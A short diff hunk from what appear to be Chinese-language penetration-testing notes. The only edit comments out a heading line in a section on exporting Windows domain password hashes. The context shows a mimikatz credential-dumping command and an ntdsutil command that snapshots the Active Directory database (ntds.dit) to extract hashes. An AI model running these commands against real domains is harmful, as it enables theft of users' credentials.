@@ -52,7 +52,7 @@ mimikatz# sekurlsa::loginpasswords full
 
 ### 3. 导出域Hash ntds,dit
 ```
- 创建快照
+# 创建快照
 ntdsutil snapshot "activate instance ntds" create quit quit
 GUID 为 {aa488f5b-40c7-4044-b24f-16fd041a6de2}
 
